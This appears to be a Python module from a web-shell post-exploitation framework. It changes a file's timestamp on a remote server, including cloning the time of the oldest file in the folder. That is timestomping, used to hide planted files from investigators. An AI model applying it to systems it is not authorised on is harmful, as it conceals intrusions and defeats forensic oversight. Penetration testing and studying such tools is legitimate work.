from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core import messages
from core.loggers import log
import dateutil.parser
import datetime
import time
import random
import hashlib
import base64
import os


class Touch(Module):

    """Change file timestamp."""

    aliases = [ 'touch' ]

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            PhpCode(
              "touch('${rpath}', ${epoch_ts});",
              name = 'php_touch'
              ),
            ShellCmd(
              "touch -d @${epoch_ts} '${rpath}'",
              name = 'sh_touch',
              target = Os.NIX
              ),
            ]
        )

        self.register_arguments([
          { 'name' : 'rpath', 'help' : 'Remote file path' },
          { 'name' : '-epoch-ts', 'help' : 'Epoch timestamp', 'type' : int },
          { 'name' : '-human-ts',
            'help' : 'Human readable timestamp e.g. \'2004-02-29 16:21:42\' or \'16:21\''
          },
          { 'name' : '-file-ts', 'help' : 'Clone timestamp from another file' },
          { 'name' : '-oldest-file-ts',
            'help' : 'Clone timestamp from the oldest file in the same folder',
            'action' : 'store_true',
            'default' : False
          },
          { 'name' : '-vector', 'choices' : self.vectors.get_names(), 'default' : 'php_touch' }
        ])

    def run(self):

        # Handle the cloning of the oldest timestamp in folder
        if self.args.get('oldest_file_ts'):
            # TODO: This works only in remote unix environment, fix it.
            folder = (
                os.path.split(self.args['rpath'])[0]
                if os.path.sep in self.args['rpath']
                else '.'
                )

            file_list = [
                os.path.join(folder, f)
                for f in ModuleExec('file_ls', [ folder ]).run()
                ]

            for file in file_list:
                file_time = ModuleExec('file_check', [ file, 'time' ]).run()
                self.args['epoch_ts'] = (
                    file_time if (
                        not self.args.get('epoch_ts') or
                        file_time < self.args.get('epoch_ts')
                    )
                    else None
                )

        # Handle to get timestamp from another file
        elif self.args.get('file_ts'):
            self.args['epoch_ts'] = ModuleExec('file_check', [ self.args['file_ts'], 'time' ]).run()

        # Handle to get an human readable timestamp
        elif self.args.get('human_ts'):
            try:
                self.args['epoch_ts'] = int(
                    time.mktime(
                        dateutil.parser.parse(self.args['human_ts'], yearfirst=True).timetuple()
                    )
                )
            except:
                log.warn(messages.module_file_touch.error_invalid_timestamp_format)
                return

        if not self.args.get('epoch_ts'):
            log.warn(messages.module_file_touch.error_source_timestamp_required)
            return

        self.vectors.get_result(self.args['vector'], self.args)

        # Verify execution
        if not self.args['epoch_ts'] == ModuleExec('file_check', [ self.args.get('rpath'), 'time' ]).run():
            log.warn(messages.module_file_touch.failed_touch_file)
            return

        return self.args['epoch_ts']

    def print_result(self, result):
        """Override print_result to print timestamp in an human readable form"""
        if result:
            log.info('New timestamp: %s' %
                datetime.datetime.fromtimestamp(result).strftime('%Y-%m-%d %H:%M:%S')
            )
